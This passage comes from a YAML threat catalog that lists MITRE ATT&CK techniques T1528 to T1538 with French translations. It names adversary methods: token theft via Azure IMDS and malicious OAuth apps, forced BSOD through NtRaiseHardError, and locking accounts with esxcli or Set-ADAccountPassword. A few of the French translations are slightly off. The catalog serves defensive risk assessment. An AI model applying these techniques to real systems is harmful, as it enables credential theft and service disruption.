      \ Managed Identity 2022)\n\nToken theft can also occur through social engineering,\
      \ in which case user action may be required to grant access. OAuth is one commonly\
      \ implemented framework that issues tokens to users for access to systems. An\
      \ application desiring access to cloud-based services or protected APIs can\
      \ gain entry using OAuth 2.0 through a variety of authorization protocols. An\
      \ example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation:\
      \ Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth\
      \ Code Authorization flow - June 2019) An OAuth access token enables a third-party\
      \ application to interact with resources containing user data in the ways requested\
      \ by the application without obtaining user credentials. \n \nAdversaries can\
      \ leverage OAuth authorization by constructing a malicious application designed\
      \ to be granted access to resources with the target user's OAuth token.(Citation:\
      \ Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm\
      \ OAuth 2017) The adversary will need to complete registration of their application\
      \ with the authorization server, for example Microsoft Identity Platform using\
      \ Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell,\
      \ or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019)\
      \ Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)\
      \ to the target user to entice them to grant access to the application. Once\
      \ the OAuth access token is granted, the application can gain potentially long-term\
      \ access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation:\
      \ Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nApplication access tokens\
      \ may function within a limited lifetime, limiting how long an adversary can\
      \ utilize the stolen token. However, in some cases, adversaries can also steal\
      \ application refresh tokens(Citation: Auth0 Understanding Refresh Tokens),\
      \ allowing them to obtain new access tokens without prompting the user.\nhttps://attack.mitre.org/techniques/T1528"
    translations:
      fr:
        name: "Voler le jeton d\u2019acc\xE8s \xE0 l\u2019application"
        description: "Les attaquants peuvent voler des jetons d'acc\xE8s aux applications\
          \ afin d'obtenir des identifiants leur permettant d'acc\xE9der \xE0 des\
          \ syst\xE8mes et ressources distants.\n\nLes jetons d'acc\xE8s aux applications\
          \ servent \xE0 effectuer des requ\xEAtes API autoris\xE9es au nom d'un utilisateur\
          \ ou d'un service ; ils sont couramment utilis\xE9s pour acc\xE9der \xE0\
          \ des ressources dans les applications cloud et conteneuris\xE9es, ainsi\
          \ que dans les logiciels en tant que service (SaaS). (R\xE9f\xE9rence :\
          \ Auth0 - Pourquoi vous devriez toujours utiliser des jetons d'acc\xE8s\
          \ pour s\xE9curiser les API, septembre 2019)  Les attaquants qui d\xE9robent\
          \ des jetons API de compte dans des environnements cloud et conteneuris\xE9\
          s peuvent \xEAtre en mesure d\u2019acc\xE9der \xE0 des donn\xE9es et d\u2019\
          effectuer des actions avec les autorisations de ces comptes, ce qui peut\
          \ entra\xEEner une \xE9l\xE9vation de privil\xE8ges et compromettre davantage\
          \ l\u2019environnement.\n\nPar exemple, dans les environnements Kubernetes,\
          \ les processus s\u2019ex\xE9cutant \xE0 l\u2019int\xE9rieur d\u2019un conteneur\
          \ peuvent communiquer avec le serveur API de Kubernetes \xE0 l\u2019aide\
          \ de jetons de compte de service. Si un conteneur est compromis, un attaquant\
          \ peut \xEAtre en mesure de voler le jeton du conteneur et ainsi obtenir\
          \ l\u2019acc\xE8s aux commandes de l\u2019API Kubernetes. (R\xE9f\xE9rence\
          \ : Comptes de service Kubernetes)  \n\nDe m\xEAme, les instances au sein\
          \ des pipelines de d\xE9veloppement continu / int\xE9gration continue (CI/CD)\
          \ utilisent souvent des jetons d\u2019API pour s\u2019authentifier aupr\xE8\
          s d\u2019autres services \xE0 des fins de test et de d\xE9ploiement. (R\xE9\
          f\xE9rence : Cider Security \u2013 Top 10 des risques de s\xE9curit\xE9\
          \ CI/CD) Si ces pipelines sont compromis, des attaquants pourraient voler\
          \ ces jetons et exploiter leurs privil\xE8ges.\n\nDans Azure, un attaquant\
          \ qui parvient \xE0 compromettre une ressource \xE0 laquelle est associ\xE9\
          e une identit\xE9 g\xE9r\xE9e, telle qu\u2019une machine virtuelle Azure,\
          \ peut demander des jetons \xE0 dur\xE9e de vie limit\xE9e via le service\
          \ IMDS (Azure Instance Metadata Service). Ces jetons peuvent ensuite faciliter\
          \ la r\xE9alisation d\u2019actions non autoris\xE9es ou permettre un acc\xE8\
          s \xE0 d\u2019autres services Azure, en contournant l\u2019authentification\
          \ classique bas\xE9e sur des identifiants. (R\xE9f\xE9rence : Entra Managed\
          \ Identities 2025) (R\xE9f\xE9rence : SpecterOps Managed Identity 2022)\n\
          \nLe vol de jetons peut \xE9galement se produire par le biais de l\u2019\
          ing\xE9nierie sociale, auquel cas une action de l\u2019utilisateur peut\
          \ \xEAtre n\xE9cessaire pour accorder l\u2019acc\xE8s. OAuth est un cadre\
          \ couramment mis en \u0153uvre qui d\xE9livre des jetons aux utilisateurs\
          \ pour leur permettre d\u2019acc\xE9der aux syst\xE8mes. Une application\
          \ souhaitant acc\xE9der \xE0 des services cloud ou \xE0 des API prot\xE9\
          g\xE9es peut y parvenir \xE0 l\u2019aide d\u2019OAuth 2.0 via divers protocoles\
          \ d\u2019autorisation. Le flux \xAB Authorization Code Grant \xBB de Microsoft\
          \ est un exemple de s\xE9quence couramment utilis\xE9e. (R\xE9f\xE9rence\
          \ : Microsoft Identity Platform Protocols, mai 2019) (R\xE9f\xE9rence :\
          \ Microsoft - Flux d\u2019autorisation par code OAuth, juin 2019) Un jeton\
          \ d\u2019acc\xE8s OAuth permet \xE0 une application tierce d\u2019interagir\
          \ avec des ressources contenant des donn\xE9es utilisateur selon les modalit\xE9\
          s demand\xE9es par l\u2019application, sans obtenir les identifiants de\
          \ l\u2019utilisateur. \n \nLes attaquants peuvent exploiter le processus\
          \ d'autorisation OAuth en cr\xE9ant une application malveillante con\xE7\
          ue pour obtenir l'acc\xE8s \xE0 des ressources \xE0 l'aide du jeton OAuth\
          \ de l'utilisateur cibl\xE9. (R\xE9f\xE9rence : Attaques de phishing OAuth\
          \ contre Amnesty, ao\xFBt 2019) (R\xE9f\xE9rence : Trend Micro Pawn Storm\
          \ OAuth 2017) L'attaquant devra proc\xE9der \xE0 l'enregistrement de son\
          \ application aupr\xE8s du serveur d'autorisation, par exemple la plateforme\
          \ d'identit\xE9 Microsoft via le portail Azure, l'IDE Visual Studio, l'interface\
          \ de ligne de commande, PowerShell ou des appels \xE0 l'API REST. (R\xE9\
          f\xE9rence : Microsoft - Enregistrement d\u2019une application Azure AD\
          \ - mai 2019) Il peut ensuite envoyer un [lien de spearphishing](https://attack.mitre.org/techniques/T1566/002)\
          \ \xE0 l\u2019utilisateur cible pour l\u2019inciter \xE0 accorder l\u2019\
          acc\xE8s \xE0 l\u2019application. Une fois le jeton d\u2019acc\xE8s OAuth\
          \ accord\xE9, l\u2019application peut obtenir un acc\xE8s potentiellement\
          \ \xE0 long terme aux fonctionnalit\xE9s du compte utilisateur via le [jeton\
          \ d\u2019acc\xE8s \xE0 l\u2019application](https://attack.mitre.org/techniques/T1550/001).\
          \ (Source : Microsoft - Jetons d\u2019identit\xE9 Azure AD - ao\xFBt 2019)\n\
          \nLes jetons d\u2019acc\xE8s d\u2019application peuvent avoir une dur\xE9\
          e de vie limit\xE9e, ce qui restreint la p\xE9riode pendant laquelle un\
          \ attaquant peut utiliser le jeton vol\xE9. Cependant, dans certains cas,\
          \ les attaquants peuvent \xE9galement voler des jetons de rafra\xEEchissement\
          \ d\u2019application (R\xE9f\xE9rence : Auth0 Understanding Refresh Tokens),\
          \ ce qui leur permet d\u2019obtenir de nouveaux jetons d\u2019acc\xE8s sans\
          \ demander l\u2019autorisation de l\u2019utilisateur.\nhttps://attack.mitre.org/techniques/T1528"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1529
    ref_id: T1529
    name: System Shutdown/Reboot
    description: "Adversaries may shutdown/reboot systems to interrupt access to,\
      \ or aid in the destruction of, those systems. Operating systems may contain\
      \ commands to initiate a shutdown/reboot of a machine or network device. In\
      \ some cases, these commands may also be used to initiate a shutdown/reboot\
      \ of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation:\
      \ alert_TA18_106A) They may also include shutdown/reboot of a virtual machine\
      \ via hypervisor / cloud consoles or command line tools.\n\nShutting down or\
      \ rebooting systems may disrupt access to computer resources for legitimate\
      \ users while also impeding incident response/recovery.\n\nAdversaries may also\
      \ use Windows API functions, such as `InitializeSystemShutdownExW` or `ExitWindowsEx`,\
      \ to force a system to shut down or reboot.(Citation: CrowdStrike Blog)(Citation:\
      \ Unit42 Agrius 2023) Alternatively, the `NtRaiseHardError`or `ZwRaiseHardError`\
      \ Windows API functions with the `ResponseOption` parameter set to `OptionShutdownSystem`\
      \ may deliver a \u201Cblue screen of death\u201D (BSOD) to a system.(Citation:\
      \ SonicWall)(Citation: NtRaiseHardError)(Citation: NotMe-BSOD) In order to leverage\
      \ these API functions, an adversary may need to acquire `SeShutdownPrivilege`\
      \ (e.g., via [Access Token Manipulation](https://attack.mitre.org/techniques/T1134)).(Citation:\
      \ Unit42 Agrius 2023)\n In some cases, the system may not be able to boot again.\
      \ \n\nAdversaries may attempt to shutdown/reboot a system after impacting it\
      \ in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002)\
      \ or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to\
      \ hasten the intended effects on system availability.(Citation: Talos Nyetya\
      \ June 2017)(Citation: Talos Olympic Destroyer 2018)\nhttps://attack.mitre.org/techniques/T1529"
    translations:
      fr:
        name: "Arr\xEAt/Red\xE9marrage du syst\xE8me"
        description: "Les adversaires peuvent \xE9teindre ou red\xE9marrer les syst\xE8\
          mes pour interrompre l\u2019acc\xE8s ou aider \xE0 leur destruction. Les\
          \ syst\xE8mes d\u2019exploitation peuvent contenir des commandes pour initier\
          \ un arr\xEAt ou un red\xE9marrage d\u2019une machine ou d\u2019un p\xE9\
          riph\xE9rique r\xE9seau. Dans certains cas, ces commandes peuvent \xE9galement\
          \ \xEAtre utilis\xE9es pour initier un arr\xEAt/red\xE9marrage d\u2019un\
          \ ordinateur ou d\u2019un dispositif r\xE9seau distant via [CLI du p\xE9\
          riph\xE9rique r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ (par exemple, <code>recharger</code>). (Citation : Fermeture de Microsoft\
          \ oct. 2017)(Citation : alert_TA18_106A) Ils peuvent \xE9galement inclure\
          \ l\u2019arr\xEAt/le red\xE9marrage d\u2019une machine virtuelle via des\
          \ consoles hyperviseurs/cloud ou des outils en ligne de commande.\n\nL\u2019\
          arr\xEAt ou le red\xE9marrage des syst\xE8mes peut perturber l\u2019acc\xE8\
          s aux ressources informatiques des utilisateurs l\xE9gitimes tout en entrave\
          \ la r\xE9ponse et la r\xE9cup\xE9ration des incidents.\n\nLes adversaires\
          \ peuvent \xE9galement utiliser des fonctions de l\u2019API Windows, telles\
          \ que \xAB InitializeSystemShutdownExW \xBB ou \xAB ExitWindowsEx \xBB,\
          \ pour forcer un syst\xE8me \xE0 s\u2019arr\xEAter ou \xE0 red\xE9marrer.\
          \ (Citation : Blog CrowdStrike)(Citation : Unit42 Agrius 2023) Alternativement,\
          \ les fonctions de l\u2019API Windows \xAB NtRaiseHardError \xBB ou \xAB\
          \ ZwRaiseHardError \xBB avec le param\xE8tre \xAB ResponseOption \xBB r\xE9\
          gl\xE9 sur \xAB OptionShutdownSystem \xBB peuvent offrir un \xAB \xE9cran\
          \ bleu de la mort \xBB (BSOD) \xE0 un syst\xE8me. (Citation : SonicWall)(Citation\
          \ : NtRaiseHardError)(Citation : NotMe-BSOD) Pour exploiter ces fonctions\
          \ API, un adversaire peut devoir acqu\xE9rir le \xAB SeShutdownPrivilege\
          \ \xBB (par exemple, via [Manipulation du Token d\u2019Acc\xE8s](https://attack.mitre.org/techniques/T1134)).\
          \ (Citation : Unit42 Agrius 2023)\n Dans certains cas, le syst\xE8me peut\
          \ ne pas pouvoir red\xE9marrer. \n\nLes adversaires peuvent tenter d\u2019\
          arr\xEAter ou de red\xE9marrer un syst\xE8me apr\xE8s l\u2019avoir affect\xE9\
          \ d\u2019autres mani\xE8res, comme [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002)\
          \ ou [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490),\
          \ afin d\u2019acc\xE9l\xE9rer les effets escompt\xE9s sur la disponibilit\xE9\
          \ du syst\xE8me. (Citation : Talos Nyetya juin 2017)(Citation : Talos Olympic\
          \ Destroyer 2018)\nhttps://attack.mitre.org/techniques/T1529"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1530
    ref_id: T1530
    name: Data from Cloud Storage
    description: "Adversaries may access data from cloud storage.\n\nMany IaaS providers\
      \ offer solutions for online data object storage such as Amazon S3, Azure Storage,\
      \ and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office\
      \ 365 and Google Workspace provide cloud-based document storage to users through\
      \ services such as OneDrive and Google Drive, while SaaS application providers\
      \ such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage\
      \ solutions as a peripheral or primary use case of their platform. \n\nIn some\
      \ cases, as with IaaS-based cloud storage, there exists no overarching application\
      \ (such as SQL or Elasticsearch) with which to interact with the stored objects:\
      \ instead, data from these solutions is retrieved directly though the [Cloud\
      \ API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications,\
      \ adversaries may be able to collect this data directly from APIs or backend\
      \ cloud storage objects, rather than through their front-end application or\
      \ interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)).\
      \ \n\nAdversaries may collect sensitive data from these cloud storage solutions.\
      \ Providers typically offer security guides to help end users configure systems,\
      \ though misconfigurations are a common problem.(Citation: Amazon S3 Security,\
      \ 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud\
      \ Storage Best Practices, 2019) There have been numerous incidents where cloud\
      \ storage has been improperly secured, typically by unintentionally allowing\
      \ public access to unauthenticated users, overly-broad access by all users,\
      \ or even access for any anonymous person outside the control of the Identity\
      \ Access Management system without even needing basic user permissions.\n\n\
      This open access may expose various types of sensitive data, such as credit\
      \ cards, personally identifiable information, or medical records.(Citation:\
      \ Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation:\
      \ HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\n\
      Adversaries may also obtain then abuse leaked credentials from source repositories,\
      \ logs, or other means as a way to gain access to cloud storage objects.\nhttps://attack.mitre.org/techniques/T1530"
    translations:
      fr:
        name: "Donn\xE9es issues de stockage cloud"
        description: "Les adversaires peuvent acc\xE9der aux donn\xE9es depuis le\
          \ stockage cloud.\n\nDe nombreux fournisseurs IaaS proposent des solutions\
          \ de stockage en ligne d\u2019objets de donn\xE9es telles qu\u2019Amazon\
          \ S3, Azure Storage et Google Cloud Storage. De m\xEAme, les plateformes\
          \ SaaS d\u2019entreprise telles qu\u2019Office 365 et Google Workspace fournissent\
          \ un stockage de documents cloud aux utilisateurs via des services tels\
          \ que OneDrive et Google Drive, tandis que les fournisseurs d\u2019applications\
          \ SaaS tels que Slack, Confluence, Salesforce et Dropbox peuvent proposer\
          \ des solutions de stockage cloud en p\xE9riph\xE9rique ou cas d\u2019usage\
          \ principal de leur plateforme. \n\nDans certains cas, comme pour le stockage\
          \ cloud bas\xE9 sur IaaS, il n\u2019existe pas d\u2019application globale\
          \ (comme SQL ou Elasticsearch) avec laquelle interagir avec les objets stock\xE9\
          s : \xE0 la place, les donn\xE9es de ces solutions sont r\xE9cup\xE9r\xE9\
          es directement via l'[API Cloud](https://attack.mitre.org/techniques/T1059/009).\
          \ Dans les applications SaaS, les adversaires peuvent collecter ces donn\xE9\
          es directement \xE0 partir d\u2019API ou d\u2019objets de stockage cloud\
          \ backend, plut\xF4t que via leur application ou interface frontale (c\u2019\
          est-\xE0-dire [Data from Information Reposeories](https://attack.mitre.org/techniques/T1213)).\
          \ \n\nLes adversaires peuvent collecter des donn\xE9es sensibles \xE0 partir\
          \ de ces solutions de stockage cloud. Les fournisseurs proposent g\xE9n\xE9\
          ralement des guides de s\xE9curit\xE9 pour aider les utilisateurs finaux\
          \ \xE0 configurer les syst\xE8mes, bien que les mauvaises configurations\
          \ soient un probl\xE8me courant. (Citation : Amazon S3 Security, 2019)(Citation\
          \ : Microsoft Azure Storage Security, 2019)(Citation : Meilleures pratiques\
          \ de stockage cloud de Google, 2019) Il y a eu de nombreux incidents o\xF9\
          \ le stockage cloud a \xE9t\xE9 mal s\xE9curis\xE9, g\xE9n\xE9ralement en\
          \ autorisant involontairement un acc\xE8s public \xE0 des utilisateurs non\
          \ authentifi\xE9s, un acc\xE8s trop large de tous les utilisateurs, voire\
          \ un acc\xE8s \xE0 toute personne anonyme hors du contr\xF4le du syst\xE8\
          me de gestion d\u2019acc\xE8s \xE0 l\u2019identit\xE9 sans m\xEAme n\xE9\
          cessiter des autorisations utilisateur basiques.\n\nCet acc\xE8s ouvert\
          \ peut r\xE9v\xE9ler divers types de donn\xE9es sensibles, telles que des\
          \ cartes de cr\xE9dit, des informations personnelles identifiables ou des\
          \ dossiers m\xE9dicaux. (Citation : Trend Micro S3 Exposed PII, 2017)(Citation\
          \ : Buckets Magecart S3 c\xE2bl\xE9s, 2019)(Citation : HIPAA Journal S3\
          \ Breach, 2017)(Citation : Rclone-m\xE9ga-extortion_05_2021)\n\nLes adversaires\
          \ peuvent \xE9galement obtenir puis abuser des identifiants fuit\xE9s provenant\
          \ de d\xE9p\xF4ts sources, journaux ou autres moyens afin d\u2019acc\xE9\
          der aux objets de stockage cloud.\nhttps://attack.mitre.org/techniques/T1530"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1531
    ref_id: T1531
    name: Account Access Removal
    description: 'Adversaries may interrupt availability of system and network resources
      by inhibiting access to accounts utilized by legitimate users. Accounts may
      be deleted, locked, or manipulated (ex: changed credentials, revoked permissions
      for SaaS platforms such as Sharepoint) to remove access to accounts.(Citation:
      Obsidian Security SaaS Ransomware June 2023) Adversaries may also subsequently
      log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529)
      to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation:
      Unit42 LockerGoga 2019)


      In Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code>
      and <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)
      cmdlets may be used by adversaries to modify user accounts. Accounts could also
      be disabled by Group Policy. In Linux, the <code>passwd</code> utility may be
      used to change passwords. On ESXi servers, accounts can be removed or modified
      via esxcli (`system account set`, `system account remove`).


      Adversaries who use ransomware or similar attacks may first perform this and
      other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485)
      and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede
      incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486)
      objective.

      https://attack.mitre.org/techniques/T1531'
    translations:
      fr:
        name: "Suppression de l\u2019acc\xE8s au compte"
        description: "Les adversaires peuvent perturber la disponibilit\xE9 des ressources\
          \ syst\xE8me et r\xE9seau en entravent l\u2019acc\xE8s aux comptes utilis\xE9\
          s par des utilisateurs l\xE9gitimes. Les comptes peuvent \xEAtre supprim\xE9\
          s, verrouill\xE9s ou manipul\xE9s (par exemple : identifiants modifi\xE9\
          s, permissions r\xE9voqu\xE9es pour des plateformes SaaS comme Sharepoint)\
          \ afin de supprimer l\u2019acc\xE8s aux comptes. (Citation : Ransomware\
          \ SaaS Obsidian Security juin 2023) Les adversaires peuvent \xE9galement\
          \ se d\xE9connecter par la suite et/ou effectuer un [Arr\xEAt/Red\xE9marrage\
          \ du syst\xE8me](https://attack.mitre.org/techniques/T1529) pour activer\
          \ des modifications malveillantes. (Citation : CarbonBlack LockerGoga 2019)(Citation\
          \ : Unit42 LockerGoga 2019)\n\nSous Windows, les utilitaires [Net](https://attack.mitre.org/software/S0039),\
          \ les cmdlets <code>Set-LocalUser</code> et <code>Set-ADAccountPassword</code>\
          \ [PowerShell](https://attack.mitre.org/techniques/T1059/001) peuvent \xEA\
          tre utilis\xE9s par les adversaires pour modifier les comptes utilisateurs.\
          \ Les comptes pouvaient \xE9galement \xEAtre d\xE9sactiv\xE9s par la politique\
          \ de groupe. Sous Linux, l\u2019utilitaire <code>passwd</code> peut \xEA\
          tre utilis\xE9 pour changer des mots de passe. Sur les serveurs ESXi, les\
          \ comptes peuvent \xEAtre supprim\xE9s ou modifi\xE9s via esxcli (\xAB system\
          \ account set \xBB, \xAB system account remove \xBB).\n\nLes adversaires\
          \ qui utilisent des ransomwares ou des attaques similaires peuvent d\u2019\
          abord effectuer ce comportement et d\u2019autres comportements d\u2019impact,\
          \ tels que [Destruction de donn\xE9es](https://attack.mitre.org/techniques/T1485)\
          \ et [D\xE9gradation](https://attack.mitre.org/techniques/T1491), afin d\u2019\
          entraver la r\xE9ponse ou la r\xE9cup\xE9ration avant d\u2019atteindre l\u2019\
          objectif [Donn\xE9es chiffr\xE9es pour impact](https://attack.mitre.org/techniques/T1486).\n\
          https://attack.mitre.org/techniques/T1531"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1534
    ref_id: T1534
    name: Internal Spearphishing
    description: 'After they already have access to accounts or systems within the
      environment, adversaries may use internal spearphishing to gain access to additional
      information or compromise other users within the same organization. Internal
      spearphishing is multi-staged campaign where a legitimate account is initially
      compromised either by controlling the user''s device or by compromising the
      account credentials of the user. Adversaries may then attempt to take advantage
      of the trusted internal account to increase the likelihood of tricking more
      victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1684/001).(Citation:
      Trend Micro - Int SP)


      For example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)
      or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part
      of internal spearphishing to deliver a payload or redirect to an external site
      to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056)
      on sites that mimic login interfaces.


      Adversaries may also leverage internal chat apps, such as Microsoft Teams, to
      spread malicious content or engage users in attempts to capture sensitive information
      and/or credentials.(Citation: Int SP - chat apps)

      https://attack.mitre.org/techniques/T1534'
    translations:
      fr:
        name: Spearphishing interne
        description: "Une fois qu\u2019ils ont d\xE9j\xE0 acc\xE8s \xE0 des comptes\
          \ ou syst\xE8mes dans l\u2019environnement, les adversaires peuvent utiliser\
          \ le spearphishing interne pour acc\xE9der \xE0 des informations suppl\xE9\
          mentaires ou compromettre d\u2019autres utilisateurs au sein de la m\xEA\
          me organisation. Le spearphishing interne est une campagne en plusieurs\
          \ \xE9tapes o\xF9 un compte l\xE9gitime est initialement compromis, soit\
          \ en contr\xF4lant l\u2019appareil de l\u2019utilisateur, soit en compromettant\
          \ les identifiants du compte. Les adversaires peuvent alors tenter de profiter\
          \ du compte interne de confiance pour augmenter la probabilit\xE9 de tromper\
          \ davantage de victimes en les faisant tomber dans des tentatives de phishing,\
          \ incorporant souvent [Usurpation d\u2019Identit\xE9](https://attack.mitre.org/techniques/T1684/001).\
          \ (Citation : Trend Micro - Int SP)\n\nPar exemple, les adversaires peuvent\
          \ utiliser [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)\
          \ ou [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)\
          \ dans le cadre du spearphishing interne pour livrer une charge utile ou\
          \ rediriger vers un site externe afin de capturer des identifiants via [Input\
          \ Capture](https://attack.mitre.org/techniques/T1056) sur des sites imitant\
          \ des interfaces de connexion.\n\nLes adversaires peuvent \xE9galement utiliser\
          \ des applications de chat internes, telles que Microsoft Teams, pour diffuser\
          \ du contenu malveillant ou engager les utilisateurs dans des tentatives\
          \ de capture d\u2019informations et/ou d\u2019identifiants sensibles. (Citation\
          \ : Int SP - applications de chat)\nhttps://attack.mitre.org/techniques/T1534"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1535
    ref_id: T1535
    name: Unused/Unsupported Cloud Regions
    description: 'Adversaries may create cloud instances in unused geographic service
      regions in order to evade detection. Access is usually obtained through compromising
      accounts used to manage cloud infrastructure.


      Cloud service providers often provide infrastructure throughout the world in
      order to improve performance, provide redundancy, and allow customers to meet
      compliance requirements. Oftentimes, a customer will only use a subset of the
      available regions and may not actively monitor other regions. If an adversary
      creates resources in an unused region, they may be able to operate undetected.


      A variation on this behavior takes advantage of differences in functionality
      across cloud regions. An adversary could utilize regions which do not support
      advanced detection services in order to avoid detection of their activity.


      An example of adversary use of unused AWS regions is to mine cryptocurrency
      through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which
      can cost organizations substantial amounts of money over time depending on the
      processing power used.(Citation: CloudSploit - Unused AWS Regions)

      https://attack.mitre.org/techniques/T1535'
    translations:
      fr:
        name: "R\xE9gions Cloud inutilis\xE9es/non prises en charge"
        description: "Les adversaires peuvent cr\xE9er des instances cloud dans des\
          \ r\xE9gions g\xE9ographiques de service inutilis\xE9es afin d\u2019\xE9\
          chapper \xE0 la d\xE9tection. L\u2019acc\xE8s est g\xE9n\xE9ralement obtenu\
          \ via la compr\xE9hension des comptes utilis\xE9s pour g\xE9rer l\u2019\
          infrastructure cloud.\n\nLes fournisseurs de services cloud fournissent\
          \ souvent des infrastructures \xE0 travers le monde afin d\u2019am\xE9liorer\
          \ les performances, d\u2019assurer la redondance et de permettre aux clients\
          \ de satisfaire aux exigences de conformit\xE9. Souvent, un client n\u2019\
          utilise qu\u2019un sous-ensemble des r\xE9gions disponibles et ne surveille\
          \ pas activement les autres r\xE9gions. Si un adversaire cr\xE9e des ressources\
          \ dans une r\xE9gion inutilis\xE9e, il peut \xEAtre capable d\u2019op\xE9\
          rer sans \xEAtre d\xE9tect\xE9.\n\nUne variation de ce comportement tire\
          \ parti des diff\xE9rences de fonctionnalit\xE9s selon les r\xE9gions cloud.\
          \ Un adversaire pourrait utiliser des r\xE9gions qui ne supportent pas de\
          \ services de d\xE9tection avanc\xE9s afin d\u2019\xE9viter la d\xE9tection\
          \ de leur activit\xE9.\n\nUn exemple d\u2019utilisation adversaire de r\xE9\
          gions AWS inutilis\xE9es est le minage de cryptomonnaies via [Resource Hijacking](https://attack.mitre.org/techniques/T1496),\
          \ ce qui peut co\xFBter des sommes importantes aux organisations dans le\
          \ temps selon la puissance de traitement utilis\xE9e. (Citation : CloudSploit\
          \ - R\xE9gions AWS inutilis\xE9es)\nhttps://attack.mitre.org/techniques/T1535"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1537
    ref_id: T1537
    name: Transfer Data to Cloud Account
    description: 'Adversaries may exfiltrate data by transferring the data, including
      through sharing/syncing and creating backups of cloud environments, to another
      cloud account they control on the same service.


      A defender who is monitoring for large transfers to outside the cloud environment
      through normal file transfers or over command and control channels may not be
      watching for data transfers to another account within the same cloud provider.
      Such transfers may utilize existing cloud provider APIs and the internal address
      space of the cloud provider to blend into normal traffic or avoid data transfers
      over external network interfaces.(Citation: TLDRSec AWS Attacks)


      Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled
      cloud accounts, such as creating anonymous file sharing links or, in Azure,
      a shared access signature (SAS) URI.(Citation: Microsoft Azure Storage Shared
      Access Signature)


      Incidents have been observed where adversaries have created backups of cloud
      instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment
      Jul 2018)

      https://attack.mitre.org/techniques/T1537'
    translations:
      fr:
        name: "Transf\xE9rer les donn\xE9es vers un compte cloud"
        description: "Les adversaires peuvent exfiltrer des donn\xE9es en les transf\xE9\
          rant, notamment par partage/synchronisation et cr\xE9ation de sauvegardes\
          \ d\u2019environnements cloud, vers un autre compte cloud qu\u2019ils contr\xF4\
          lent sur le m\xEAme service.\n\nUn d\xE9fenseur qui surveille les transferts\
          \ importants vers l\u2019ext\xE9rieur du cloud via des transferts de fichiers\
          \ normaux ou via des canaux de commande et de contr\xF4le peut ne pas surveiller\
          \ les transferts de donn\xE9es vers un autre compte au sein du m\xEAme fournisseur\
          \ cloud. De tels transferts peuvent utiliser les API existantes des fournisseurs\
          \ cloud et l\u2019espace d\u2019adressage interne du fournisseur cloud pour\
          \ s\u2019int\xE9grer au trafic normal ou \xE9viter les transferts de donn\xE9\
          es via des interfaces r\xE9seau externes. (Citation : Attaques AWS de TLDRSec)\n\
          \nLes adversaires peuvent \xE9galement utiliser des m\xE9canismes cloud-native\
          \ pour partager les donn\xE9es des victimes avec des comptes cloud contr\xF4\
          l\xE9s par l\u2019adversaire, comme la cr\xE9ation de liens de partage de\
          \ fichiers anonymes ou, dans Azure, une signature d\u2019acc\xE8s partag\xE9\
          \ (URI) SAS. (Citation : Signature d\u2019acc\xE8s partag\xE9 Microsoft\
          \ Azure Storage)\n\nDes incidents ont \xE9t\xE9 observ\xE9s o\xF9 des adversaires\
          \ ont cr\xE9\xE9 des sauvegardes d\u2019instances cloud et les ont transf\xE9\
          r\xE9es sur des comptes s\xE9par\xE9s. (Citation : Inculpation du DOJ GRU\
          \ juillet 2018)\nhttps://attack.mitre.org/techniques/T1537"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1538
    ref_id: T1538
    name: Cloud Service Dashboard
    description: 'An adversary may use a cloud service dashboard GUI with stolen credentials
      to gain useful information from an operational cloud environment, such as specific
      services, resources, and features. For example, the GCP Command Center can be
      used to view all assets, review findings of potential security risks, and run
      additional queries, such as finding public IP addresses and open ports.(Citation:
      Google Command Center Dashboard)


      Depending on the configuration of the environment, an adversary may be able
      to enumerate more information via the graphical dashboard than an API. This
      also allows the adversary to gain information without manually making any API
      requests.

      https://attack.mitre.org/techniques/T1538'
    translations:
      fr:
        name: Tableau de bord des services cloud
        description: "Un adversaire peut utiliser une interface graphique de tableau\
